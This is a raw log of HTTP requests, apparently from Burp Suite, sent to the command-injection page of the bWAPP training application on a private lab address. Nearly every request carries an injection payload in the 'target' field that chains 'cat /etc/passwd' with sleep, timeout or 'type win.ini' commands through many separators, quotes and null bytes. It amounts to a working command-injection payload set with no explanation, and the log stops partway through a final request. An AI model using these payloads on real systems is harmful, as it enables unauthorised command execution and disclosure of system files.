+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%0Asleep+15%0A&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%60sleep+15%60&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7C%7Csleep+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26%26sleep+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7Csleep+15%23&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26sleep%24pg+15%26&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bsleep%24pg+15%3B&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%26sleep%24pg+15%26%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%3Bsleep%24pg+15%3B%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%26sleep%24pg+15%26%27&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%3Bsleep%24pg+15%3B%27&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%0Asleep%24pg+15%0A&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%60sleep%24pg+15%60&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7C%7Csleep%24pg+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26%26sleep%24pg+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7Csleep%24pg+15%23&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=type+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26type+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswdrun+type+%25SYSTEMROOT%25%5Cwin.ini&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26type+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswdrun+type+%25SYSTEMROOT%25%5Cwin.ini%00&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26timeout+%2FT+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%7Ctimeout+%2FT+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
